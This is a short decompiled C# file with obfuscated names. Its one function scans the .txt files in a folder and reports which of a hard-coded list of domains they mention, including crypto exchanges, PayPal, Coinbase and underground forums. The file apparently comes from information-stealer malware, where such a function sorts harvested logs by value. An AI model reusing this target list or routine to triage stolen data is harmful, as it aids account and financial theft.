using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

internal class Class59
{
	public static string smethod_0(string string_0)
	{
		try
		{
			string[] array = new string[12]
			{
				"cryptonator.com", "payeer.com", "lolz.guru", "wwh-club.net", "xss.is", "bhf.io", "btc.com", "minergate.com", "blockchain.com", "github.com",
				"coinbase.com", "paypal.com"
			};
			FileInfo[] files = new DirectoryInfo(string_0).GetFiles("*.txt", SearchOption.TopDirectoryOnly);
			List<string> list = new List<string>();
			FileInfo[] array2 = files;
			foreach (FileInfo fileInfo in array2)
			{
				list.AddRange(File.ReadAllLines(fileInfo.FullName, Encoding.UTF8));
			}
			HashSet<string> hashSet = new HashSet<string>();
			foreach (string item in list)
			{
				foreach (string item2 in (from w in item.Split()
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList())
				{
					if (!hashSet.Contains(item2))
					{
						hashSet.Add(item2);
					}
				}
			}
			HashSet<string> hashSet2 = new HashSet<string>();
			string[] array3 = array;
			foreach (string text in array3)
			{
				foreach (string item3 in hashSet)
				{
					if (item3.Contains(text) && !hashSet2.Contains(text))
					{
						hashSet2.Add(text);
					}
				}
			}
			return string.Join("\n - ", hashSet2);
		}
		catch (Exception)
		{
			return "";
		}
	}
}
